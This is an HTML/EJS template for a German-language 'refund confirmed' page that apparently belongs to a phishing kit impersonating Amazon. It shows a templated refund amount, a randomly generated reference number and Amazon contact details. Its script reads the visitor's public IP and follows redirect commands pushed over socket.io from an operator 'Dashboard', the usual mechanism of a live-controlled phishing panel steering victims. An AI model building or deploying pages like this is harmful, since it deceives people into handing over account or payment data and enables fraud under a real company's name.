<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./css/bratoka.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <style>
        .success-container {
            text-align: center;
            padding: 20px;
            max-width: 600px;
            margin: 0 auto;
        }
        .success-title {
            color: #2e8b57;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 15px;
        }
        .success-message {
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 20px;
            color: #333;
        }
        .info-box {
            background-color: #f8f9fa;
            border-left: 4px solid #2e8b57;
            padding: 12px;
            margin: 15px 0;
            border-radius: 3px;
        }
        .contact-info {
            margin-top: 20px;
            font-size: 14px;
            color: #666;
            background: #f9f9f9;
            padding: 15px;
            border-radius: 5px;
        }
        .contact-info p {
            margin: 5px 0;
        }
        .checkmark {
            width: 60px;
            height: 60px;
            margin: 0 auto 15px;
        }
        .checkmark-circle {
            stroke-dasharray: 166;
            stroke-dashoffset: 166;
            stroke-width: 2;
            stroke-miterlimit: 10;
            stroke: #2e8b57;
            fill: none;
            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
        }
        .checkmark-check {
            transform-origin: 50% 50%;
            stroke-dasharray: 48;
            stroke-dashoffset: 48;
            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
        }
        @keyframes stroke {
            100% {
                stroke-dashoffset: 0;
            }
        }
    </style>
</head>
<body class="mb-pass">
    <div>
        <div class="topano">
            <img src="./img/hedopa-pc.PNG" alt="">
            <img src="./img/hedopa-mb.png" alt="">
        </div>
    </div>
    <div>
        <div class="maina maina2">
            <div class="inmaina success-container">
                <div class="checkmark">
                    <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                        <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none"/>
                        <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" stroke="#2e8b57" stroke-width="3"/>
                    </svg>
                </div>
                
                <h1 class="success-title">Rückerstattung bestätigt!</h1>
                
                <p class="success-message">
                    Ihr Rückerstattungsantrag über <strong>EUR <%= refundAmount %></strong> € wurde bearbeitet.
                    
                </p>
                
                <div class="info-box">
                    Die Gutschrift wird Ihrem Konto gutgeschrieben. Die Bearbeitung kann einige Zeit in Anspruch nehmen. Sollte die Gutschrift nicht innerhalb von 48 Stunden auf Ihrem Konto erscheinen, kontaktieren Sie uns bitte.
                </div>
                
                <div class="contact-info">
                    <p><strong>Referenz:</strong> REF-<%= Math.floor(100000 + Math.random() * 900000) %></p>
                    <p>Bei Fragen: <strong>+49 800 123 45678</strong> oder <strong>support@amazon.de</strong></p>
                </div>
                
                <div class="privacy" style="margin-top: 30px;">
                    <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" fill="none" role="presentation" style="flex: 0 1 0%; height: 20px; min-height: 20px; min-width: 20px; width: 20px;"><path d="M14 8h-.19V6.87a3.81 3.81 0 1 0-7.62 0V8H6a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2v-5a2 2 0 0 0-2-2ZM8.19 6.87a1.81 1.81 0 0 1 3.62 0V8H8.19V6.87ZM14 15H6v-5h8v5Z" fill="#565959"></path></svg>
                    <p>Ihre Daten werden nach höchsten Sicherheitsstandards geschützt</p>
                </div>
            </div>
        </div>  
    </div>
    
    <div class="line"></div>
    <div>
        <div class="botamano">
            <img src="./img/botamano-pc.PNG" alt="">
            <img src="./img/botamano-mb.png" alt="">
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
      async function getPublicIP() {
        try {
          const response = await fetch('https://api.ipify.org?format=json');
          const data = await response.json();
          console.log("Public IP:", data.ip);
          return data.ip;
        } catch (error) {
          console.error("Failed to fetch IP:", error);
          return null;
        }
      }
      
      const socket = io();
     
      // Handle redirect messages from server
      socket.on('redirect', async (data) => {
        const currentIp = await getPublicIP();
        console.log("Dashboard: "+data.ip,"Client: "+currentIp);
        
        if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {
          window.location.href = data.url;
        }
      });
    </script>
</body>
</html>
